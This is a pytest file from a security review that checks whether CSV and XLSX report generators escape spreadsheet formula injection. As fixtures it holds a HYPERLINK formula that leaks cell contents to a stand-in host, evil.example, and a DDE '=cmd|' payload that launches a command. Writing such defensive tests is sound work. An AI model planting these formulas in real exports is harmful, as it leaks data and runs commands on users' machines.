"""Security review M5: attacker-influenced strings never become live spreadsheet formulas."""

import csv
import io

import pytest
from openpyxl import load_workbook

from conftest import NOW, make_snapshot, snapshot_data
from posture.reports.cells import safe_cell
from posture.reports.registry import generate

EVIL = '=HYPERLINK("http://evil.example/?leak="&A1,"click")'
DANGEROUS = ("=", "+", "-", "@", "\t", "\r")


@pytest.mark.parametrize("value,expected", [
    ("=1+1", "'=1+1"), ("+cmd", "'+cmd"), ("-2", "'-2"), ("@SUM(A1)", "'@SUM(A1)"), ("\tx", "'\tx"),
    ("\rx", "'\rx"), ("ok", "ok"), ("", ""), (5, 5), (-3.5, -3.5), (None, None),
])
def test_safe_cell(value, expected):
    assert safe_cell(value) == expected


def _evil_snapshot():
    data = snapshot_data()
    img = data["images"][0]
    img["ref"] = f"docker.io/library/nginx:{EVIL}"
    img["tag"] = EVIL
    img["workloads"] = ["+web/Deployment/frontend", "@x/Job/y"]
    for f in data["findings"]:
        f["title"] = "-" + f["title"]
        f["package"] = "=cmd|' /C calc'!A0"
    data["workloads"][0]["name"] = "=evil"
    return make_snapshot(**{k: v for k, v in data.items()})


def _assert_csv_clean(content: bytes):
    for row in csv.reader(io.StringIO(content.decode("utf-8-sig"))):
        for cell in row:
            assert not cell.startswith(DANGEROUS), cell


def _assert_xlsx_clean(content: bytes):
    wb = load_workbook(io.BytesIO(content))
    seen = 0
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                assert c.data_type != "f", (ws.title, c.coordinate, c.value)
                if isinstance(c.value, str):
                    assert not c.value.startswith(DANGEROUS), (ws.title, c.coordinate, c.value)
                    seen += c.value.startswith("'=")
    assert seen  # the evil values are present, neutralised


@pytest.mark.parametrize("report,fmt", [("poam", "csv"), ("inventory", "csv"), ("vuln-export", "csv")])
def test_csv_reports_neutralise_formulas(report, fmt):
    rep = generate(report, fmt, _evil_snapshot(), {"now": NOW})
    _assert_csv_clean(rep.content)
    if report != "poam":  # POA&M cells embed the values mid-text
        assert b"'=HYPERLINK" in rep.content or b"'=cmd" in rep.content


@pytest.mark.parametrize("report", ["poam", "inventory"])
def test_xlsx_reports_neutralise_formulas(report):
    _assert_xlsx_clean(generate(report, "xlsx", _evil_snapshot(), {"now": NOW}).content)
